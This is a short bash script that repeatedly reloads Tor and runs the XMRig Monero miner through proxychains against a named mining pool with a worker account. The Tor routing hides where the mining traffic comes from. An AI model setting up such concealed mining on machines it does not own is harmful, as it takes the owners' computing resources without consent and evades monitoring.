#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url us-east.cryptonight-hub.miningpoolhub.com:20580 --user slicommeo.1 --pass 1 --keepalive --donate-level 1 --tls -t 8
done
